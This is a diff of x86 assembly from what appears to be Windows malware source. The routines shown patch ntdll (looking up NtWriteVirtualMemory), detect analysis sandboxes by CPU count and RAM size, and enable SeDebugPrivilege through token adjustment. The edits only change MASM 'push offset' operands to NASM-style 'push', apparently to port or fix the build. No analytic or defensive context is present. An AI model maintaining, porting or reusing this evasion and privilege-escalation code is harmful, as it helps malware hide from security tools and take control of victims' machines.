@@ -182,7 +182,7 @@ _patch_ntdll:
     mov ebx, eax
     
     ; Find NtWriteVirtualMemory
-    push offset ntwrite_name
+    push ntwrite_name
     push ebx
     call _GetProcAddress
     test eax, eax
@@ -275,14 +275,14 @@ _check_sandbox:
     jl .sandbox_detected
     
     ; Method 2: Check CPU count (sandboxes often have 1 CPU)
-    push offset sys_info
+    push sys_info
     call _GetSystemInfo
     mov eax, [sys_info + 20]    ; dwNumberOfProcessors
     cmp eax, 2
     jl .sandbox_detected
     
     ; Method 3: Check RAM size (sandboxes often have limited RAM)
-    push offset mem_status
+    push mem_status
     call _GlobalMemoryStatus
     mov eax, [mem_status + 8]   ; dwTotalPhys
     cmp eax, 0x40000000         ; Less than 1GB
@@ -399,15 +399,15 @@ _elevate_process:
     
     ; Try to enable SeDebugPrivilege
     push 0
-    push offset token_handle
+    push token_handle
     push 0xF01FF                ; TOKEN_ALL_ACCESS
     call _OpenProcessToken
     test eax, eax
     jz .error
     
     ; Lookup privilege value
-    push offset luid
-    push offset debug_priv
+    push luid
+    push debug_priv
     push 0
     call _LookupPrivilegeValueA
     test eax, eax
@@ -418,7 +418,7 @@ _elevate_process:
     push 0
     push 0
     push 16
-    push offset token_privs
+    push token_privs
     push dword [token_handle]
     call _AdjustTokenPrivileges
     
